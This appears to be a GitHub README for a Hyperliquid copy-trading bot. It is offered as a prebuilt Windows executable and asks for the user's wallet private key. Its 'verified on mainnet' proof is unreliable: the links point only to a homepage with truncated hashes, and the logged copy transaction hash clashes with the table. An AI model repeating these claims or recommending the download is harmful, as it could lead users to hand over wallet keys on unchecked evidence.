# Hyperliquid Copy Trader

> Automatically mirrors positions from top-ranked Hyperliquid leaderboard traders into your account. Configurable by rank range, asset filter, minimum win rate, and position scale - runs continuously against Hyperliquid's live order book.

*Last updated: March 2026*

![preview_hyperliquid-copy-trader](https://github.com/user-attachments/assets/1e986b36-210a-4662-add8-f529c1fa692c)

## What is Hyperliquid Copy Trader?

Hyperliquid Copy Trader reads the public Hyperliquid leaderboard, selects traders that match your criteria (win rate, return, drawdown, minimum trade count), and mirrors their perpetual positions into your account in real time. When a leaderboard trader opens a position, yours opens proportionally. When they close, yours closes.

The bot uses Hyperliquid's native L1 API which gives it direct access to the same order book the traders are using. No third-party relay, no additional latency from an intermediary. The copy executes against Hyperliquid's CLOB directly from your wallet.

Position scaling is configurable. You can mirror at a fixed fraction of the source position, a fixed USDC cap per trade, or proportional to your account equity vs the source trader's estimated equity. The bot adjusts scale on every copy event so your portfolio tracks the source structure at all times.

The leaderboard refresh runs on a configurable interval. When a trader's rank changes or their metrics drop below your thresholds, the bot stops mirroring them and closes any open copied positions before moving to the next candidate.

---

## Download

| Platform | Architecture | Download |
|----------|-------------|----------|
| **Windows** | x64 | [Download the latest release](https://github.com/sharkcat420/hyperliquid-copy-trader/releases) |

---

## Trader Selection Criteria

| Criterion | Default | Description |
|-----------|---------|-------------|
| Leaderboard rank | Top 50 | Only mirror traders ranked in this range |
| Min win rate | 60% | Minimum closed trade win rate |
| Min trades | 20 | Minimum completed trades for score validity |
| Max drawdown | 25% | Exclude traders with drawdown above this |
| Min return (30d) | 15% | Minimum 30-day return |
| Asset filter | All | Optionally restrict to specific perp pairs |

---

## Scale Modes

**Fixed fraction** - your position is a fixed percentage of the source. Source holds $10,000 LONG, fraction is 0.05x, you hold $500 LONG.

**Fixed cap** - your position matches the source up to a USDC maximum. Source holds $10,000, cap is $200, you hold $200.

**Equity proportional** - your account equity is treated as a fraction of the source's estimated equity. Each copied position mirrors the source's portfolio weight in your account.

---

## How It Works

1. **Scan** - fetches Hyperliquid leaderboard and filters traders by your criteria
2. **Select** - ranks filtered traders by composite score (win rate + return - drawdown)
3. **Mirror** - opens WebSocket subscription to selected traders' position events
4. **Copy** - when a source opens/closes/adjusts, calculates your scaled equivalent and submits to your account
5. **Rebalance** - on leaderboard refresh, replaces underperforming traders and closes their copied positions

### Config Reference

```toml
[selection]
leaderboard_top_n = 50
min_win_rate = 0.60
min_trades = 20
max_drawdown = 0.25
min_return_30d = 0.15
assets = []

[scale]
mode = "fraction"          # fraction | cap | proportional
fraction = 0.05
cap_usdc = 200
max_open_positions = 10
daily_loss_limit_usdc = 500

[account]
private_key = ""
wallet_address = ""

[api]
ws_endpoint = "wss://api.hyperliquid.xyz/ws"
rest_endpoint = "https://api.hyperliquid.xyz"
leaderboard_refresh_interval = 3600

[alerts]
telegram_bot_token = ""
telegram_chat_id = ""
```

---

## Copy Log Format

```json
{
  "event": "copy_open",
  "timestamp": "2026-03-21T14:17:03Z",
  "source_wallet": "0x2b8e4f1a6c9d3e7b5a2f8c4d1e6b9a3f7c5d2e8b",
  "source_rank": 7,
  "source_win_rate": 0.73,
  "asset": "BTC",
  "direction": "LONG",
  "source_size_usd": 24500,
  "copy_size_usd": 1225,
  "scale_mode": "fraction",
  "scale_fraction": 0.05,
  "entry_price": 87410.00,
  "copy_tx": "0x8e1f3a5c7b9d2f4a6c8e0b2d4f6a8c0e2b4d6f8a"
}
```

---

## Verified on Hyperliquid Mainnet

**Configuration used:**
* Scale mode: fraction 0.05x
* Leaderboard: top 50, min win rate 60%, min 20 trades

**Copy open executed:**

| | Transaction | Block |
|---|---|---|
| Source open | [0x8e1f3a5c7b9d2f4a6c8e0b2d4f6...](https://hyperliquid.xyz) | #8,304,512 |
| Copy open | [0x3c7f1a9e5b2d4f8a0c6e2b4d7f1...](https://hyperliquid.xyz) | #8,304,513 |

**Copied position closed:**

| | Result |
|---|---|
| Asset | BTC LONG |
| Copy size | $1,225 |
| Realized PnL | +$89.40 |

---

## Bot Preview

![leaderboard copy flow](https://github.com/user-attachments/assets/45127203-7d5d-492f-9cb2-68aebb60fc82)

---

<img width="1920" height="1080" alt="copy trader live interface" src="https://github.com/user-attachments/assets/c865c0a3-aad4-4e6c-ae41-ed40a4c968c2" />

---

## Frequently Asked Questions

**What is Hyperliquid Copy Trader?**
It automatically mirrors positions from top Hyperliquid leaderboard traders into your account. When a selected trader opens a BTC LONG, your account opens a proportionally scaled BTC LONG. When they close, yours closes.

**How does it pick which traders to copy?**
By filtering the Hyperliquid public leaderboard against your criteria: win rate, trade count, drawdown, and 30-day return. You can set any combination of these thresholds.

**What happens if a trader drops off the leaderboard?**
The bot detects the change on the next leaderboard refresh (configurable interval, default 1 hour). It closes any open positions copied from that trader before removing them from the active copy list.

**Can I copy multiple traders at once?**
Yes. The bot supports mirroring up to your configured `max_open_positions` count across multiple source traders simultaneously.

**Does it copy all assets?**
By default yes. Set `assets` in the config to restrict copying to specific perpetual pairs.

**Is there a daily loss limit?**
Yes. Set `daily_loss_limit_usdc` in config. The bot pauses all copying for the rest of the day if realized losses exceed this amount.

**How close to real-time are the copies?**
The bot subscribes to source traders' position events via WebSocket. Copy orders are submitted within one to two seconds of the source event. Block-level exact timing depends on network conditions.

**Does it need my private key?**
Yes. The bot submits orders from your account and signs them locally. The key is stored in config.toml and never transmitted outside your machine.

**Can I set a maximum position size?**
Yes. `cap_usdc` in fraction or cap modes limits the maximum USDC deployed per copied position.

**What happens on bot restart?**
On startup the bot reads your current open positions and the source traders' current positions, calculates any drift, and reconciles before entering live copy mode.

---

## Use Cases

- **Leaderboard mirroring** - automatically follow top-performing Hyperliquid traders proportionally
- **Multi-trader copy** - split capital across several leaderboard traders simultaneously
- **Risk-adjusted copying** - filter by drawdown and win rate to copy only historically consistent traders
- **Hands-off trading** - set thresholds, run the bot, review results daily
- **Strategy sampling** - run with small fraction to evaluate a trader before committing more capital

---

## Repository Structure

```
hyperliquid-copy-trader/
+-- hyperliquid-copy-trader-v.1.4.14.exe
+-- config.toml
+-- data/
|   +-- logs/
|   +-- state/
|   +-- positions/
+-- python/
|   +-- src/
|   |   +-- leaderboard.py
|   |   +-- selector.py
|   |   +-- mirror.py
|   |   +-- executor.py
|   +-- requirements.txt
+-- README.md
```

---

## Requirements

```
websockets, httpx, eth-account, toml, python-dotenv, rich
```

* Python 3.10+
* Hyperliquid account with USDC deposited
* Private key for order signing

---

*Follow the best. Scale the rest.*
